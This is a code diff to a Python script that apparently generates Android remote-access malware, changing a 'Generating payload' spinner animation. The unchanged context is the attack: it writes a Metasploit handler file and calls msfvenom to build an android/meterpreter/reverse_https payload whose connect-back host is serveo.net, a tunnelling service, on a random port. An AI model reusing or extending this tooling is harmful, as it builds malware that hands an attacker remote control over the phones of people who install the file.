@@ -8,18 +8,34 @@ import threading
 import sys
 
 R='\033[1;31m'
+
 cycle = ['|', '/', '-', '\\']
+
+string = 'Generating payload ..'
+
+list = []
+
+for c in string:
+ list.append(c)
+
 port = random.randint(4444, 5555)
+
 os.system('rm automate.rc')
+
 with open('automate.rc', 'w') as f:
  f.write(f'use exploit/multi/handler\nset payload android/meterpreter/reverse_https\nset LHOST serveo.net\nset LPORT {port}')
 
 def animate():
  for c in cycle:
-  sys.stdout.write(f"\r[*] Generating payload .. {c}")
-  sys.stdout.flush()
-  sys.stdout.flush()
-  time.sleep(0.1)
+  for n in range(len(list)):
+   old = list[n]
+   list[n] = old.upper()
+   final = "".join(list)
+   sys.stdout.write('\r')
+   sys.stdout.write(f"{final} {c}")
+   sys.stdout.flush()
+   list[n] = old
+   time.sleep(0.1)
 
 def check():
  try:
@@ -48,7 +64,6 @@ time.sleep(7)
 
 def generate():
  print('\n')
- time.sleep(1)
  generate = subprocess.call(f"msfvenom -p android/meterpreter/reverse_https LHOST=serveo.net LPORT={port} R> $HOME/Lemon/{name}", shell=True)
 
 gen = threading.Thread(target=generate)
